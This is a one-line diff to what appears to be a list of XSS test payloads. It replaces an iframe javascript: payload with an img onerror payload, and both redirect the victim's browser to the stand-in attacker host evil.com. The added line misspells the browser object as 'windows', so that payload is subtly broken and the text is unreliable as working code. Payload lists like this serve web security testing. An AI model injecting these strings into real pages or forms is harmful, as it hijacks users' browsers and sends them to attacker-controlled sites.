@@ -1,1 +1,1 @@
-"><IFRAME SRC="javascript:javascript:window.location.replace('http://evil.com');"></IFRAME>
+"><img src=x onerror=windows.location.replace('http://evil.com');>
